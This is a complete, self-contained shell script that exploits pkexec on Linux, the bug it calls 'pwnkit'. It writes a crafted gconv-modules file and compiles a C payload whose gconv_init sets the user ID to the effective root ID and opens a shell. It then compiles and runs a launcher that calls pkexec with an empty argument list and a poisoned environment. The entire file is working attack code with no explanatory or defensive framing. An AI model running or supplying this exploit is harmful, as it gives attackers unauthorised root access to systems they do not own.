#!/bin/sh

BAK_PATH=$(echo $PATH)

mkdir "GCONV_PATH=."
touch "GCONV_PATH=./target=a"
chmod +x "GCONV_PATH=./target=a"

mkdir "target=a"
cat > "target=a/gconv-modules"<<EOF
module  PAYLOAD//    INTERNAL    ../../../../../../../..$(pwd)/payload    2
module  INTERNAL    PAYLOAD//    ../../../../../../../..$(pwd)/payload    2
EOF

cat > payload.c<<EOF
#include <stdio.h>
#include <stdlib.h>

void gconv() {}

void gconv_init() {
  setreuid(geteuid(), geteuid());
  printf("[!] Code executed through pkexec! UID: %d\n", geteuid());
  system("/bin/sh -c 'PATH=\"$(echo $BAK_PATH)\" /bin/sh'");
  exit(0);
}
EOF

gcc payload.c -o payload.so -shared -fPIC 2>/dev/null

cat > pwnkit.c<<EOF
#include <unistd.h>

int main(int argc, char* argv[]){
  puts("[*] Attempting to run pkexec..");
  char* _envp[] = {"target=a", "PATH=GCONV_PATH=.", "CHARSET=PAYLOAD","SHELL=/etc/lasdasd", NULL};
  execve("/usr/bin/pkexec", 0, _envp);
}
EOF

gcc pwnkit.c -o pwnkit 2>/dev/null

echo "[!] Running pwnkit executable"
./pwnkit
